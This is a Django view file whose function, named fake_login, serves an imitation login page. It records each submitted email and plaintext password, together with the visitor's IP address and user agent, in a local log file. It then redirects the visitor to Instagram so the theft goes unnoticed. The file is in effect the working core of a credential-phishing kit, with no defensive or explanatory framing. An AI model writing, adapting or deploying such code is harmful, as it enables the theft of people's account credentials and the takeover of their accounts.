import json
from datetime import datetime, timezone

from django.conf import settings
from django.shortcuts import redirect, render


LOG_FILE = settings.BASE_DIR / "demo_form_submissions.log"


def _get_client_ip(request):
    forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR", "")
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()
    return request.META.get("REMOTE_ADDR", "")


def fake_login(request):
    sent = request.method == "POST"
    if sent:
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "ip": _get_client_ip(request),
            "user_agent": request.META.get("HTTP_USER_AGENT", ""),
            "email": request.POST.get("email", "").strip().lower(),
            "password": request.POST.get("password", ""),
        }
        with open(LOG_FILE, "a", encoding="utf-8") as log_file:
            log_file.write(json.dumps(entry) + "\n")
        return redirect("https://www.instagram.com/")
    return render(request, "demo/login.html", {"sent": False})
